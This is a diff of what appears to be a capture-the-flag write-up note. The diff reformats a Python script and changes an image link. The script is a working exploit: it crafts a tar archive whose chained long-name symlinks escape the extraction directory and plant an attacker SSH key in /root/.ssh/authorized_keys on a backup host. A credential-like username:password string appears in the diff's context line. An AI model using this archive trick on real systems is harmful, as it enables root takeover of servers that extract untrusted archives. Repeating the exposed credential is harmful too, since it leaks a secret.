@@ -70,50 +70,62 @@ wacky:!#7Blushing^*Bride5
 ![[IMG-20260215022951810.png]]
 
 ```python
-import tarfile, os, io, sys  
-  
-pub = open("/tmp/pwn.pub","rb").read()  
-out = "/opt/backup_clients/backups/backup_9999.tar"  
-  
-comp = 'd' * (55 if sys.platform == "darwin" else 247)  
-steps = "abcdefghijklmnop"  
-path = ""  
-  
-with tarfile.open(out, "w") as tar:  
-for i in steps:  
-d = tarfile.TarInfo(os.path.join(path, comp))  
-d.type = tarfile.DIRTYPE  
-tar.addfile(d)  
-  
-s = tarfile.TarInfo(os.path.join(path, i))  
-s.type = tarfile.SYMTYPE  
-s.linkname = comp  
-tar.addfile(s)  
-  
-path = os.path.join(path, comp)  
-  
-linkpath = os.path.join("/".join(steps), "l"*254)  
-  
-l = tarfile.TarInfo(linkpath)  
-l.type = tarfile.SYMTYPE  
-l.linkname = "../" * len(steps)  
-tar.addfile(l)  
-  
-e = tarfile.TarInfo("escape")  
-e.type = tarfile.SYMTYPE  
-e.linkname = linkpath + "/../../../../../../root/.ssh"  
-tar.addfile(e)  
-  
-f = tarfile.TarInfo("escape/authorized_keys")  
-f.type = tarfile.REGTYPE  
-f.mode = 0o600  
-f.size = len(pub)  
-tar.addfile(f, fileobj=io.BytesIO(pub))  
-  
+import tarfile
+import os
+import io
+
+pub = open("/tmp/pwn.pub", "rb").read()
+out = "/opt/backup_clients/backups/backup_9999.tar"
+
+# Long directory name used to build a deep path structure
+comp = "d" * 247
+
+# Symlink chain steps
+steps = "abcdefghijklmnop"
+path = ""
+
+with tarfile.open(out, "w") as tar:
+
+    # Create nested directories + symlinks (a -> comp, b -> comp, ...)
+    for i in steps:
+        d = tarfile.TarInfo(os.path.join(path, comp))
+        d.type = tarfile.DIRTYPE
+        tar.addfile(d)
+
+        s = tarfile.TarInfo(os.path.join(path, i))
+        s.type = tarfile.SYMTYPE
+        s.linkname = comp
+        tar.addfile(s)
+
+        path = os.path.join(path, comp)
+
+    # Create a long symlink path inside the a/b/c/... chain
+    linkpath = os.path.join("/".join(steps), "l" * 254)
+
+    # Symlink that goes back up inside the extraction directory
+    l = tarfile.TarInfo(linkpath)
+    l.type = tarfile.SYMTYPE
+    l.linkname = "../" * len(steps)
+    tar.addfile(l)
+
+    # Symlink pointing (after resolution) outside the destination directory
+    e = tarfile.TarInfo("escape")
+    e.type = tarfile.SYMTYPE
+    e.linkname = linkpath + "/../../../../../../root/.ssh"
+    tar.addfile(e)
+
+    # Write authorized_keys through the escape symlink
+    f = tarfile.TarInfo("escape/authorized_keys")
+    f.type = tarfile.REGTYPE
+    f.mode = 0o600
+    f.size = len(pub)
+    tar.addfile(f, fileobj=io.BytesIO(pub))
+
 print("[+] written:", out)
+
 ```
 
-![[IMG-20260215022235557.png]]
+![[IMG-20260215212040805.png]]
 
 
 ![[IMG-20260215014201690.png]]
